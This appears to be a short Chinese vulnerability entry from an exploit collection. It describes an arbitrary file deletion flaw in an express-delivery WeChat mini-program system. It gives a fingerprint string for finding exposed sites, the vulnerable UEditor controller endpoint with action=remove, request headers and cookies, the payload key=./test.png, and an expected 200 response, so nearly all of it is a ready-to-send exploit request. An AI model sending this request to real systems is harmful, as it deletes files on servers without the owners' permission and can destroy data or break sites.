# 快递微信小程序系统controller存在任意文件删除漏洞

- **系统**：快递微信小程序系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/static/default/newwap/lang/js/jquery.localize.min.js"`
- **请求**：`POST /public/qiniu_ueditor/php/controller.php?action=remove HTTP/1.1`
- **关键头**：`Content-Length: 13`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: think_var=zh-cn; PHPSESSID=5cg6kramfusrb94homfj2q7ku1; thinkphp_show_page_trace=…`　`sec-fetch-user: ?1`

**请求体 / payload**
```
key=./test.png
```
- **预期**：200　|　—